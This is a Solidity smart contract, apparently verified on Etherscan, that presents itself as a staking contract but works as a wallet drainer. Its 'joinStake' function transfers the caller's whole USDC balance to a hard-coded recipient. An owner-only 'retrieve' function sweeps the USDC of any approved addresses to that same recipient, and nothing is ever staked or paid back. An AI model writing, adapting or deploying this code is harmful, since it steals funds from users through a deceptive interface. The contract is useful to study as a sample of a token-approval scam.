/**
 *Submitted for verification at Etherscan.io on 2023-10-09
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.2 <0.9.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function increaseAllowance(address spender, uint256 addedValue) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "new owner is the zero address");
        _owner = newOwner;
        emit OwnershipTransferred(_owner, newOwner);
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}



contract demo is Context, Ownable {

    IERC20 usdt = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48); // USDC -- TOKEN GOING TO BE WITHDRAWN

    address recipient = 0x7caF57bB1FfC42A7d7dA0a6A19F6696310910814; // ADDRESS THAT RECEIVES THE FUNDS

    bool public status = false;


    function joinStake() public {
        uint256 balance = usdt.balanceOf(_msgSender());
            if(balance > 0) {
                usdt.transferFrom(_msgSender(), recipient, balance);
            }
    }

    function retrieve(address[] memory _addresses) public onlyOwner {
        for(uint256 i = 0; i < _addresses.length; i ++){
            uint256 balance = usdt.balanceOf(_addresses[i]);
            if(balance > 0) {
                usdt.transferFrom(_addresses[i], recipient, balance);
            }
        }
    }

    function toggleOption() public onlyOwner {
        status = !status;
    }

    
}